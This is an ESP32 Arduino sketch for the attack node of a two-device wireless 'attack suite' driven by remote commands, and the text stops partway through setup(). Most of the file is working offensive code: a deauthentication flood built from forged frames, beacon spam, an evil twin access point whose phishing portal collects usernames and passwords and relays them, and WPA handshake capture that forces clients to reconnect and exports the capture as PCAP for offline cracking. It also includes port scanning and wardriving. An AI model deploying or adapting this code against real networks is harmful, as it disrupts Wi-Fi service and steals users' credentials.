/**
 * ╔══════════════════════════════════════════════════════════════╗
 * ║  ESP32 NODE 2 — Full Wireless Attack / Security Suite       ║
 * ║  ─────────────────────────────────────────────────────────  ║
 * ║  Receives commands from Node1 (ESP1) via ESP-NOW.           ║
 * ║  Sends all results back via ESP-NOW.                        ║
 * ║                                                              ║
 * ║  SETUP:                                                      ║
 * ║   1. Flash this sketch and open Serial Monitor (115200).    ║
 * ║   2. Note "My STA MAC:" printed at boot.                    ║
 * ║   3. Paste that MAC into esp1.ino  ESP2_MAC[].              ║
 * ║   4. Note "My AP  MAC:" from ESP1 Serial Monitor.           ║
 * ║   5. Paste that MAC into  ESP1_MAC[] below.                 ║
 * ║                                                              ║
 * ║  Commands handled:                                           ║
 * ║   ping, monitor start|stop, channel N, scan                 ║
 * ║   deauth <BSSID> <CH> [<clientMAC>], deauth stop            ║
 * ║   beacon start|stop                                          ║
 * ║   eviltwin <SSID>, eviltwin stop                            ║
 * ║   handshake <BSSID> <CH>, handshake stop, handshake get     ║
 * ║   pmkid <BSSID> <CH> <SSID>, pmkid stop                    ║
 * ║   sae <BSSID> <CH>, sae stop                                ║
 * ║   saquery <BSSID> <CH>, saquery stop                        ║
 * ║   assocflood <BSSID> <CH>, assocflood stop                  ║
 * ║   wardrive start|stop                                        ║
 * ║   portscan <IP> <startP> <endP>                             ║
 * ║   status                                                     ║
 * ╚══════════════════════════════════════════════════════════════╝
 */

#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_now.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <WiFiClient.h>

// ─────────────────────────────────────────────
//  ★ CONFIGURE: paste ESP1's AP MAC here
//    (printed "AP  MAC:" on ESP1 Serial Monitor at boot)
// ─────────────────────────────────────────────
uint8_t ESP1_MAC[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; // ← CHANGE THIS TO YOUR NODE 1 AP MAC

esp_now_peer_info_t peerInfo;

// ─────────────────────────────────────────────
//  Command queue (ISR → loop)  — 4-slot FIFO
//  Prevents drops when a heartbeat ping arrives
//  while processing another command.
// ─────────────────────────────────────────────
#define CMD_LEN        160
#define CMD_QUEUE_SIZE 4
static char          cmdQueue[CMD_QUEUE_SIZE][CMD_LEN];
static volatile int  cmdQHead = 0;
static volatile int  cmdQTail = 0;

// ─────────────────────────────────────────────
//  Helpers: send message back to ESP1 / browser
// ─────────────────────────────────────────────
void sendToESP1(const char* msg) {
  size_t l = strlen(msg);
  if (l > 250) l = 250;
  esp_err_t r = esp_now_send(ESP1_MAC, (const uint8_t*)msg, l);
  Serial.printf("[TX→ESP1] %s  (err=%d)\n", msg, r);
}

// ── Forward-declare monitor globals (needed by reinitEspNow) ──
volatile bool     monitorRunning = false;
volatile uint32_t pktCount       = 0;
volatile int16_t  lastRSSI       = 0;
volatile uint8_t  lastChan       = 1;
unsigned long     lastStatTime   = 0;
#define STAT_MS 1000

// ─────────────────────────────────────────────
//  Re-initialise ESP-NOW — NEVER calls WiFi.mode()!
//  Only used after Evil Twin (the one legit mode change).
// ─────────────────────────────────────────────
void reinitEspNow() {
  esp_now_deinit();
  delay(50);
  // DO NOT call WiFi.mode() here — that's what was breaking everything!
  if (esp_now_init() != ESP_OK) {
    Serial.println("[ESP-NOW] reinit FAILED");
    return;
  }
  extern void OnDataRecv(const esp_now_recv_info_t*, const uint8_t*, int);
  esp_now_register_recv_cb(OnDataRecv);

  memset(&peerInfo, 0, sizeof(peerInfo));
  memcpy(peerInfo.peer_addr, ESP1_MAC, 6);
  peerInfo.channel = 0;          // 0 = send on current channel
  peerInfo.encrypt = false;
  peerInfo.ifidx   = WIFI_IF_STA;

  if (esp_now_add_peer(&peerInfo) != ESP_OK) {
    Serial.println("[ESP-NOW] re-add peer FAILED");
  } else {
    Serial.println("[ESP-NOW] reinit OK");
  }
  // Return to channel 1 so we can hear ESP1
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  lastChan = 1;
}

// ─────────────────────────────────────────────
//  MAC helpers
// ─────────────────────────────────────────────
bool parseMac(const char* str, uint8_t* mac) {
  return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
    &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6;
}
void macStr(const uint8_t* m, char* out) {
  sprintf(out, "%02X:%02X:%02X:%02X:%02X:%02X",
    m[0], m[1], m[2], m[3], m[4], m[5]);
}

// ═════════════════════════════════════════════════════════════════
//  MONITOR MODE  (globals declared above reinitEspNow)
// ═════════════════════════════════════════════════════════════════

// ═════════════════════════════════════════════════════════════════
//  HANDSHAKE / PCAP CAPTURE
// ═════════════════════════════════════════════════════════════════
#define HS_MAX (12 * 1024)   // 12 kB capture buffer
bool      hsRunning    = false;
uint8_t   hsBSSID[6]  = {0};
uint8_t*  hsBuf        = nullptr;
uint32_t  hsBufLen     = 0;
int       hsEapolCount = 0;
// ISR staging buffer (tiny, just one frame at a time)
volatile bool     hsPktReady = false;
uint8_t           hsTmpPkt[400];
volatile uint16_t hsTmpLen  = 0;

// PCAP base-64 encoder
static const char B64[] =
  "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

int b64Encode(const uint8_t* in, int inLen, char* out) {
  int o = 0;
  for (int i = 0; i < inLen; i += 3) {
    uint32_t b = (uint32_t)in[i] << 16;
    if (i+1 < inLen) b |= (uint32_t)in[i+1] << 8;
    if (i+2 < inLen) b |= in[i+2];
    out[o++] = B64[(b>>18)&0x3F];
    out[o++] = B64[(b>>12)&0x3F];
    out[o++] = (i+1 < inLen) ? B64[(b>>6)&0x3F] : '=';
    out[o++] = (i+2 < inLen) ? B64[b&0x3F]       : '=';
  }
  out[o] = '\0';
  return o;
}

void initPcap() {
  if (!hsBuf) hsBuf = (uint8_t*)malloc(HS_MAX);
  if (!hsBuf) { sendToESP1("[Node2] ERROR: Not enough heap for PCAP buffer."); return; }
  hsBufLen     = 0;
  hsEapolCount = 0;
  // PCAP global header — LinkType 105 = IEEE 802.11
  uint32_t magic = 0xA1B2C3D4;
  uint16_t vmaj  = 2, vmin = 4;
  int32_t  zone  = 0;
  uint32_t sigs  = 0, snap = 65535, net = 105;
  auto w4 = [&](uint32_t v){ memcpy(hsBuf+hsBufLen, &v, 4); hsBufLen+=4; };
  auto w2 = [&](uint16_t v){ memcpy(hsBuf+hsBufLen, &v, 2); hsBufLen+=2; };
  w4(magic); w2(vmaj); w2(vmin);
  w4((uint32_t)zone); w4(sigs); w4(snap); w4(net);
}

void appendPcapPkt(const uint8_t* data, int len) {
  if (!hsBuf || (hsBufLen + 16 + (uint32_t)len) > HS_MAX) return;
  uint32_t ts_s  = millis() / 1000;
  uint32_t ts_us = (millis() % 1000) * 1000;
  uint32_t l     = (uint32_t)len;
  auto w4 = [&](uint32_t v){ memcpy(hsBuf+hsBufLen, &v, 4); hsBufLen+=4; };
  w4(ts_s); w4(ts_us); w4(l); w4(l);
  memcpy(hsBuf+hsBufLen, data, len);
  hsBufLen += len;
}

// ═════════════════════════════════════════════════════════════════
//  SNIFFER CALLBACK  (runs in WiFi ISR — keep minimal!)
// ═════════════════════════════════════════════════════════════════
void IRAM_ATTR snifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
  pktCount++;
  lastRSSI = p->rx_ctrl.rssi;
  lastChan = p->rx_ctrl.channel;

  if (!hsRunning || hsPktReady) return;
  if (type != WIFI_PKT_DATA)   return;

  int len = p->rx_ctrl.sig_len;
  if (len > 4) len -= 4;   // strip FCS
  if (len < 28 || len > (int)sizeof(hsTmpPkt)) return;

  uint8_t* pl  = p->payload;
  uint16_t fc  = *(uint16_t*)pl;
  bool isQos   = ((fc >> 4) & 0x0F) >= 8;
  int  hdrLen  = isQos ? 26 : 24;
  if (len <= hdrLen + 8) return;

  // Determine AP MAC position in frame
  bool toDS   = (fc >> 8) & 0x01;
  bool fromDS = (fc >> 8) & 0x02;
  uint8_t* bssid_in_frame;
  if      (!toDS && !fromDS)   bssid_in_frame = pl + 16; // addr3
  else if  (toDS && !fromDS)   bssid_in_frame = pl +  4; // addr1 = AP
  else                          bssid_in_frame = pl + 10; // addr2 = AP

  // EAPOL: LLC SNAP header AA AA 03 + EtherType 88 8E
  uint8_t* llc = pl + hdrLen;
  if (llc[0]==0xAA && llc[1]==0xAA && llc[6]==0x88 && llc[7]==0x8E) {
    if (memcmp(bssid_in_frame, hsBSSID, 6)==0 || hsBSSID[0]==0xFF) {
      memcpy(hsTmpPkt, pl, len);
      hsTmpLen   = (uint16_t)len;
      hsPktReady = true;
    }
  }
}

// ═════════════════════════════════════════════════════════════════
//  MONITOR
// ═════════════════════════════════════════════════════════════════
void startMonitor() {
  pktCount = 0;
  monitorRunning = true;
  esp_wifi_set_promiscuous_rx_cb(snifferCb);
  esp_wifi_set_promiscuous(true);
  sendToESP1("[Node2] Monitor Mode Started.");
}

void stopMonitor() {
  monitorRunning = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  // ★ Return to ch1 so ESP1 can reach us
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  lastChan = 1;
  sendToESP1("[Node2] Monitor Mode Stopped.");
}

// Enable raw frame injection (required for esp_wifi_80211_tx)
void ensurePromiscuous() {
  if (!monitorRunning) esp_wifi_set_promiscuous(true);
}

// ═════════════════════════════════════════════════════════════════
//  DEAUTH FLOOD
// ═════════════════════════════════════════════════════════════════
bool    deauthRunning = false;
uint8_t deauthAP[6]  = {0};
uint8_t deauthCli[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
uint8_t deauthChan   = 1;
unsigned long lastDeauthTime = 0;
#define DEAUTH_MS 80

void buildDeauthFrame(uint8_t* f, const uint8_t* ap, const uint8_t* cli) {
  f[0]=0xC0; f[1]=0x00;          // type: Deauthentication
  f[2]=0x00; f[3]=0x00;          // duration
  memcpy(f+4,  cli, 6);          // DA
  memcpy(f+10, ap,  6);          // SA  (spoofed as AP)
  memcpy(f+16, ap,  6);          // BSSID
  f[22]=0x00; f[23]=0x00;        // seq
  f[24]=0x07; f[25]=0x00;        // reason: Class 3 frame received
}

void doDeauth() {
  uint8_t frm[26];
  // AP → client
  buildDeauthFrame(frm, deauthAP, deauthCli);
  esp_wifi_80211_tx(WIFI_IF_STA, frm, sizeof(frm), false);
  // client → AP
  buildDeauthFrame(frm, deauthCli, deauthAP);
  esp_wifi_80211_tx(WIFI_IF_STA, frm, sizeof(frm), false);
  // Disassociation (reason: AP leaving BSS)
  frm[0]=0xA0;
  memcpy(frm+4, deauthCli, 6); memcpy(frm+10, deauthAP, 6); memcpy(frm+16, deauthAP, 6);
  frm[22]=0; frm[23]=0; frm[24]=0x08; frm[25]=0x00;
  esp_wifi_80211_tx(WIFI_IF_STA, frm, sizeof(frm), false);
}



// ═════════════════════════════════════════════════════════════════
//  BEACON SPAM
// ═════════════════════════════════════════════════════════════════
bool beaconRunning = false;
unsigned long lastBeaconTime = 0;
int beaconIdx = 0;
#define BEACON_MS 80
#define MAX_SSIDS 15
const char beaconSSIDs[MAX_SSIDS][33] = {
  "FBI Surveillance Van", "Not Your WiFi", "SkyNet_Global_Nodes",
  "Virus.exe", "TellMyWiFiLoveHer", "Pretty Fly For A WiFi",
  "The Promised LAN", "Abraham Linksys", "Silence of the LANs",
  "Bill WiFi The Science Fi", "The Internet", "FreePublicWiFi",
  "Loading...", "404 Network Not Found", "HackersHideout"
};

void doBeacon() {
  const char* ssid   = beaconSSIDs[beaconIdx % MAX_SSIDS]; beaconIdx++;
  int         ssidLen = strlen(ssid); if(ssidLen>32) ssidLen=32;
  uint8_t buf[150]; int p=0;
  buf[p++]=0x80; buf[p++]=0x00; // Beacon
  buf[p++]=0x00; buf[p++]=0x00;
  memset(buf+p, 0xFF, 6); p+=6; // DA = broadcast
  // Random SA
  for(int i=0;i<6;i++) buf[p++] = esp_random()&0xFF;
  buf[p-6] &= 0xFE; buf[p-6] |= 0x02;
  memcpy(buf+p, buf+p-6, 6); p+=6; // BSSID = SA
  buf[p++]=0x00; buf[p++]=0x00; // seq
  memset(buf+p, 0, 8);  p+=8;   // timestamp
  buf[p++]=0x64; buf[p++]=0x00; // beacon interval 100 TU
  buf[p++]=0x31; buf[p++]=0x04; // capabilities: ESS|Privacy
  buf[p++]=0x00; buf[p++]=(uint8_t)ssidLen;
  memcpy(buf+p, ssid, ssidLen); p+=ssidLen;
  buf[p++]=0x01; buf[p++]=0x08;
  buf[p++]=0x82; buf[p++]=0x84; buf[p++]=0x8b; buf[p++]=0x96;
  buf[p++]=0x0c; buf[p++]=0x12; buf[p++]=0x18; buf[p++]=0x24;
  buf[p++]=0x03; buf[p++]=0x01; buf[p++]=lastChan;
  if(p<(int)sizeof(buf)) esp_wifi_80211_tx(WIFI_IF_STA, buf, p, false);
}



// ═════════════════════════════════════════════════════════════════
//  EVIL TWIN + CAPTIVE PORTAL
// ═════════════════════════════════════════════════════════════════
bool       evilTwinRunning = false;
WebServer* evilServer      = nullptr;
DNSServer* dnsServer       = nullptr;

const char PORTAL_HTML[] = R"rawliteral(
<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login</title>
<style>
body{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.card{background:#fff;border-radius:12px;padding:36px 28px;width:320px;box-shadow:0 4px 24px rgba(0,0,0,.12)}
h2{text-align:center;color:#1a73e8;margin:0 0 6px}
p{text-align:center;color:#777;font-size:13px;margin:0 0 20px}
input{width:100%;padding:11px 14px;margin:6px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box;font-size:15px}
button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;margin-top:10px}
</style></head><body>
<div class="card"><h2>&#128246; WiFi Login</h2>
<p>Please sign in to access the internet</p>
<form method="POST" action="/submit">
<input type="text" name="user" placeholder="Email or Username" required>
<input type="password" name="pass" placeholder="WiFi Password" required>
<button type="submit">Sign In &amp; Connect</button>
</form></div></body></html>
)rawliteral";

void startEvilTwin(const char* ssid) {
  if (monitorRunning) stopMonitor();
  // Evil Twin genuinely needs AP mode — this is the ONE allowed mode change
  esp_now_deinit(); // save ESP-NOW state
  WiFi.mode(WIFI_AP_STA);
  delay(100);
  WiFi.softAP(ssid, nullptr, 1, 0, 8);
  delay(200);
  // Restore ESP-NOW in AP_STA mode
  reinitEspNow();
  if (!dnsServer)  { dnsServer  = new DNSServer(); dnsServer->start(53, "*", WiFi.softAPIP()); }
  if (!evilServer) {
    evilServer = new WebServer(80);
    evilServer->on("/", HTTP_GET, [](){ evilServer->send(200, "text/html", PORTAL_HTML); });
    evilServer->on("/submit", HTTP_POST, [](){
      String u  = evilServer->arg("user");
      String pw = evilServer->arg("pass");
      char buf[200];
      snprintf(buf, sizeof(buf), "[EvilTwin] CAPTURED: user=%s pass=%s", u.c_str(), pw.c_str());
      sendToESP1(buf);
      evilServer->send(200, "text/html",
        "<html><body style='font-family:Arial;text-align:center;padding:50px'>"
        "<h2 style='color:green'>&#10003; Connected!</h2>"
        "<p>Verifying your credentials...</p></body></html>");
    });
    evilServer->on("/generate_204",          [](){ evilServer->send(200,"text/html",PORTAL_HTML); });
    evilServer->on("/hotspot-detect.html",   [](){ evilServer->send(200,"text/html",PORTAL_HTML); });
    evilServer->on("/connecttest.txt",       [](){ evilServer->send(200,"text/plain","Microsoft Connect Test"); });
    evilServer->onNotFound([](){
      evilServer->sendHeader("Location","http://192.168.4.1/");
      evilServer->send(302);
    });
    evilServer->begin();
  }
  evilTwinRunning = true;
  char msg[90];
  snprintf(msg, sizeof(msg), "[Node2] EvilTwin '%s' active at 192.168.4.1", ssid);
  sendToESP1(msg);
}

void stopEvilTwin() {
  if (evilServer) { evilServer->close(); delete evilServer; evilServer=nullptr; }
  if (dnsServer)  { dnsServer->stop();   delete dnsServer;  dnsServer=nullptr; }
  evilTwinRunning = false;
  WiFi.softAPdisconnect(true);
  // Go back to STA-only without using WiFi.mode() which resets everything
  esp_wifi_set_mode(WIFI_MODE_STA);
  delay(100);
  reinitEspNow();
  sendToESP1("[Node2] Evil Twin stopped.");
}

// ─────────────────────────────────────────────
//  Periodic deauth timer (used during handshake
//  to keep pressure and force re-association)
// ─────────────────────────────────────────────
unsigned long lastHsDeauthTime = 0;
#define HS_DEAUTH_MS 2500   // re-deauth every 2.5s while capturing

void startHandshake(const char* bssidStr, int ch) {
  parseMac(bssidStr, hsBSSID);
  initPcap();
  if (ch >= 1 && ch <= 13) {
    lastChan = (uint8_t)ch;
    esp_wifi_set_channel(lastChan, WIFI_SECOND_CHAN_NONE);
  }
  monitorRunning = true;
  esp_wifi_set_promiscuous_rx_cb(snifferCb);
  esp_wifi_set_promiscuous(true);
  hsRunning = true;
  lastHsDeauthTime = millis();

  char buf[90];
  snprintf(buf, sizeof(buf), "[Node2] Handshake capture started. Target: %s  ch%d", bssidStr, ch);
  sendToESP1(buf);
  sendToESP1("[Handshake] Sending deauth burst to force re-association...");

  // Initial deauth burst — kick all clients off the AP
  uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t frm[26];
  for (int i = 0; i < 12; i++) {
    buildDeauthFrame(frm, hsBSSID, bcast);
    esp_wifi_80211_tx(WIFI_IF_STA, frm, sizeof(frm), false);
    delay(5);
    // Also send a disassoc to cover PMF-lite clients
    frm[0] = 0xA0; frm[24]=0x08; frm[25]=0x00;
    esp_wifi_80211_tx(WIFI_IF_STA, frm, sizeof(frm), false);
    frm[0] = 0xC0; frm[24]=0x07; frm[25]=0x00; // restore to deauth
    delay(5);
  }
}

void sendPcapDownload() {
  if (!hsBuf || hsBufLen < 25) {
    sendToESP1("[Node2] No handshake data captured yet.");
    return;
  }
  // Chunk size: 150 raw bytes → 200 base64 chars → fits in 250-byte ESP-NOW packet
  #define CHUNK_BYTES 150
  int  total = (hsBufLen + CHUNK_BYTES - 1) / CHUNK_BYTES;
  char header[64];
  snprintf(header, sizeof(header), "[PCAP:START:%d:%lu]", total, (unsigned long)hsBufLen);
  sendToESP1(header);
  delay(30);
  char b64buf[210];
  for (int i=0; i<total; i++) {
    int off = i * CHUNK_BYTES;
    int rem = hsBufLen - off; if(rem > CHUNK_BYTES) rem = CHUNK_BYTES;
    b64Encode(hsBuf+off, rem, b64buf);
    char msg[260];
    snprintf(msg, sizeof(msg), "[PCAP:%d/%d:%s]", i, total, b64buf);
    sendToESP1(msg);
    delay(25); // give ESP-NOW time to transmit each chunk
  }
  sendToESP1("[PCAP:END]");
}

// ═════════════════════════════════════════════════════════════════
//  PORT SCAN
// ═════════════════════════════════════════════════════════════════
void doPortScan(const char* ip, int startP, int endP) {
  char msg[100];
  snprintf(msg, sizeof(msg), "[PortScan] Scanning %s  ports %d-%d ...", ip, startP, endP);
  sendToESP1(msg);
  int openCount = 0;
  for (int port = startP; port <= endP; port++) {
    WiFiClient client;
    client.setTimeout(400);
    if (client.connect(ip, port)) {
      client.stop();
      openCount++;
      snprintf(msg, sizeof(msg), "[PortScan] OPEN  %s:%d", ip, port);
      sendToESP1(msg);
      delay(10);
    }
  }
  snprintf(msg, sizeof(msg), "[PortScan] Done. Found %d open port(s).", openCount);
  sendToESP1(msg);
}

// ═════════════════════════════════════════════════════════════════
//  WARDRIVING
// ═════════════════════════════════════════════════════════════════
bool          wardrive   = false;
int           wdScanCh   = 1;
unsigned long lastWdTime = 0;
#define WD_INTERVAL 3000

void doWardrive() {
  bool wasProm = monitorRunning;
  if (wasProm) esp_wifi_set_promiscuous(false);

  // Set to the current wardrive channel
  esp_wifi_set_channel(wdScanCh, WIFI_SECOND_CHAN_NONE);
  delay(10);

  // Use ESP-IDF scan — NO WiFi.mode() calls!
  wifi_scan_config_t scanConf;
  memset(&scanConf, 0, sizeof(scanConf));
  scanConf.channel    = wdScanCh; // scan only this channel
  scanConf.show_hidden = true;
  scanConf.scan_type   = WIFI_SCAN_TYPE_ACTIVE;
  scanConf.scan_time.active.min = 80;
  scanConf.scan_time.active.max = 200;

  esp_wifi_scan_start(&scanConf, true);

  uint16_t found = 0;
  esp_wifi_scan_get_ap_num(&found);
  uint16_t toRead = (found > 10) ? 10 : found;

  char buf[120];
  snprintf(buf, sizeof(buf), "[Wardrive] ch%d → %d APs", wdScanCh, (int)found);
  sendToESP1(buf);

  if (toRead > 0) {
    wifi_ap_record_t* recs = (wifi_ap_record_t*)malloc(sizeof(wifi_ap_record_t) * toRead);
    if (recs) {
      esp_wifi_scan_get_ap_records(&toRead, recs);
      for (int i = 0; i < toRead; i++) {
        snprintf(buf, sizeof(buf), "[WD] %02X:%02X:%02X:%02X:%02X:%02X | ch%d | %ddBm | %s",
          recs[i].bssid[0],recs[i].bssid[1],recs[i].bssid[2],
          recs[i].bssid[3],recs[i].bssid[4],recs[i].bssid[5],
          recs[i].primary, recs[i].rssi, (char*)recs[i].ssid);
        sendToESP1(buf);
        delay(15);
      }
      free(recs);
    }
  }

  wdScanCh = (wdScanCh % 13) + 1;
  // Return to ch1 so ESP1 can reach us between scans
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  lastChan = 1;
  if (wasProm) esp_wifi_set_promiscuous(true);
}

// ═════════════════════════════════════════════════════════════════
//  COMMAND DISPATCHER
// ═════════════════════════════════════════════════════════════════
void processCommand(char* cmd) {
  Serial.printf("[CMD] %s\n", cmd);
  // Trim trailing whitespace/newlines
  int l = strlen(cmd);
  while (l > 0 && (cmd[l-1]==' '||cmd[l-1]=='\n'||cmd[l-1]=='\r')) cmd[--l]='\0';
  if (l == 0) return;

  // ── heartbeat ───────────────────────────────────
  if (strcmp(cmd,"ping")==0) {
    sendToESP1("[Node2] PONG");
    return;
  }

  // ── monitor ─────────────────────────────────────
  if (strcmp(cmd,"monitor start")==0)  { startMonitor(); return; }
  if (strcmp(cmd,"monitor stop")==0)   { stopMonitor(); return; }

  // ── channel ─────────────────────────────────────
  if (strncmp(cmd,"channel ",8)==0) {
    int ch = atoi(cmd+8);
    if (ch>=1 && ch<=13) {
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      lastChan = (uint8_t)ch;
      char b[50]; snprintf(b,sizeof(b),"[Node2] Channel set to %d",ch);
      sendToESP1(b);
    }
    return;
  }

  // ── scan ────────────────────────────────────────
  if (strcmp(cmd,"scan")==0) {
    bool wasMon = monitorRunning;
    if (wasMon) { esp_wifi_set_promiscuous(false); monitorRunning = false; }
    if (evilTwinRunning) stopEvilTwin();

    sendToESP1("[Node2] Scanning...");

    // Use ESP-IDF scan API directly — does NOT reset WiFi mode!
    // ESP-NOW stays alive throughout the scan.
    wifi_scan_config_t scanConf;
    memset(&scanConf, 0, sizeof(scanConf));
    scanConf.show_hidden = true;
    scanConf.scan_type   = WIFI_SCAN_TYPE_ACTIVE;
    scanConf.scan_time.active.min = 100;
    scanConf.scan_time.active.max = 300;

    esp_wifi_scan_start(&scanConf, true); // true = blocking

    uint16_t apCount = 0;
    esp_wifi_scan_get_ap_num(&apCount);
    if (apCount > 20) apCount = 20; // cap results

    wifi_ap_record_t* apRecords = (wifi_ap_record_t*)malloc(sizeof(wifi_ap_record_t) * apCount);
    if (apRecords) {
      esp_wifi_scan_get_ap_records(&apCount, apRecords);
      for (int i = 0; i < apCount; i++) {
        char buf[130];
        snprintf(buf, sizeof(buf), "[Scan] %02X:%02X:%02X:%02X:%02X:%02X | ch%d | %ddBm | %s",
          apRecords[i].bssid[0], apRecords[i].bssid[1], apRecords[i].bssid[2],
          apRecords[i].bssid[3], apRecords[i].bssid[4], apRecords[i].bssid[5],
          apRecords[i].primary, apRecords[i].rssi, (char*)apRecords[i].ssid);
        sendToESP1(buf);
        delay(20);
      }
      free(apRecords);
    }

    // Return to channel 1 so ESP1 can reach us
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    lastChan = 1;

    if (wasMon) startMonitor();
    return;
  }

  // ── deauth stop (must come BEFORE "deauth ") ────
  if (strcmp(cmd,"deauth stop")==0) {
    deauthRunning = false;
    if (!monitorRunning && !hsRunning)
      esp_wifi_set_promiscuous(false);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE); lastChan = 1;
    sendToESP1("[Node2] Deauth stopped.");
    return;
  }
  // ── deauth <BSSID> <CH> [<client>] ─────────────
  if (strncmp(cmd,"deauth ",7)==0) {
    char* tok = strtok(cmd+7," ");
    if (tok && parseMac(tok, deauthAP)) {
      char* chStr = strtok(nullptr," ");
      char* cli   = strtok(nullptr," ");
      if (chStr && atoi(chStr)>0) {
        deauthChan = (uint8_t)atoi(chStr);
      } else { deauthChan = lastChan; }
      if (cli) parseMac(cli, deauthCli); else memset(deauthCli,0xFF,6);
      esp_wifi_set_channel(deauthChan, WIFI_SECOND_CHAN_NONE);
      ensurePromiscuous();
      deauthRunning = true;
      char buf[100];
      snprintf(buf,sizeof(buf),"[Node2] Deauth flood → %s ch%d",tok,(int)deauthChan);
      sendToESP1(buf);
    }
    return;
  }

  // ── beacon ──────────────────────────────────────
  if (strcmp(cmd,"beacon start")==0) {
    ensurePromiscuous(); beaconRunning=true;
    sendToESP1("[Node2] Beacon spam started."); return;
  }
  if (strcmp(cmd,"beacon stop")==0) {
    beaconRunning=false;
    if (!monitorRunning && !hsRunning && !deauthRunning)
      esp_wifi_set_promiscuous(false);
    sendToESP1("[Node2] Beacon spam stopped."); return;
  }

  // ── eviltwin stop (must come BEFORE "eviltwin ") ─
  if (strcmp(cmd,"eviltwin stop")==0) { stopEvilTwin(); return; }
  if (strncmp(cmd,"eviltwin ",9)==0)  { startEvilTwin(cmd+9); return; }

  // ── handshake stop / get (must come BEFORE "handshake ") ─
  if (strcmp(cmd,"handshake stop")==0) {
    hsRunning=false; stopMonitor();
    sendToESP1("[Node2] Handshake capture stopped.");
    char b[70]; snprintf(b,sizeof(b),"[Node2] Captured %d EAPOL frames.",hsEapolCount);
    sendToESP1(b);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE); lastChan = 1;
    return;
  }
  if (strcmp(cmd,"handshake get")==0) { sendPcapDownload(); return; }
  if (strncmp(cmd,"handshake ",10)==0) {
    // handshake <BSSID> <CH>
    char* bssidStr = strtok(cmd+10," ");
    char* chStr    = strtok(nullptr," ");
    if (bssidStr) {
      int ch = (chStr && atoi(chStr)>0) ? atoi(chStr) : (int)lastChan;
      startHandshake(bssidStr, ch);
    }
    return;
  }



  // ── wardrive ────────────────────────────────────
  if (strcmp(cmd,"wardrive start")==0) { wardrive=true;  sendToESP1("[Node2] Wardriving started."); return; }
  if (strcmp(cmd,"wardrive stop")==0)  { wardrive=false; sendToESP1("[Node2] Wardriving stopped."); return; }

  // ── portscan ────────────────────────────────────
  if (strncmp(cmd,"portscan ",9)==0) {
    char ip[20]=""; int sp=1, ep=1024;
    sscanf(cmd+9,"%19s %d %d", ip, &sp, &ep);
    if (strlen(ip)>0) doPortScan(ip, sp, ep);
    return;
  }

  // ── status ──────────────────────────────────────
  if (strcmp(cmd,"status")==0) {
    char b[200];
    snprintf(b,sizeof(b),
      "[Node2] mon=%s dauth=%s bcn=%s evil=%s hs=%s wd=%s ch=%d heap=%lu",
      monitorRunning?"ON":"OFF", deauthRunning?"ON":"OFF", beaconRunning?"ON":"OFF",
      evilTwinRunning?"ON":"OFF", hsRunning?"ON":"OFF",
      wardrive?"ON":"OFF", (int)lastChan, (unsigned long)ESP.getFreeHeap());
    sendToESP1(b);
    return;
  }

  // ── unknown ─────────────────────────────────────
  char b[120];
  snprintf(b,sizeof(b),"[Node2] Unknown command: '%s'",cmd);
  sendToESP1(b);
}

// ═════════════════════════════════════════════════════════════════
//  ESP-NOW RECEIVE CALLBACK  (WiFi ISR context)
//  Enqueues into 4-slot FIFO — never drops real commands
// ═════════════════════════════════════════════════════════════════
void OnDataRecv(const esp_now_recv_info_t* info, const uint8_t* data, int len) {
  if (len <= 0 || len >= CMD_LEN) return;
  int next = (cmdQTail + 1) % CMD_QUEUE_SIZE;
  if (next == cmdQHead) return; // queue full — drop (very rare)
  memcpy(cmdQueue[cmdQTail], data, len);
  cmdQueue[cmdQTail][len] = '\0';
  cmdQTail = next;
}

// ═════════════════════════════════════════════════════════════════
//  SETUP
// ═════════════════════════════════════════════════════════════════
void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println("\n\n==== ESP32 Node 2 — Pen-Tool Attack Engine ====");

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false, false);
  delay(100);

  Serial.println("╔══════════════════════════════════════════════╗");
  Serial.printf ("║  My STA MAC: %-32s║\n", WiFi.macAddress().c_str());
  Serial.println("║  → Paste above into esp1.ino  ESP2_MAC[]    ║");
  Serial.println("╚══════════════════════════════════════════════╝");

  if (esp_now_init() != ESP_OK) {
    Serial.println("FATAL: ESP-NOW init failed!"); while(1) delay(1000);
  }
  esp_now_register_recv_cb(OnDataRecv);

  memset(&peerInfo, 0, sizeof(peerInfo));
  memcpy(peerInfo.peer_addr, ESP1_MAC, 6);
  peerInfo.channel = 0;          // 0 = send on current channel
  peerInfo.encrypt = false;
  peerInfo.ifidx   = WIFI_IF_STA;

  Serial.printf("Targeting ESP1 AP MAC: %02X:%02X:%02X:%02X:%02X:%02X on ch1\n",
    ESP1_MAC[0],ESP1_MAC[1],ESP1_MAC[2],ESP1_MAC[3],ESP1_MAC[4],ESP1_MAC[5]);

  if (esp_now_add_peer(&peerInfo) != ESP_OK)
    Serial.println("ERROR: peer add failed — check ESP1_MAC[]");
  else
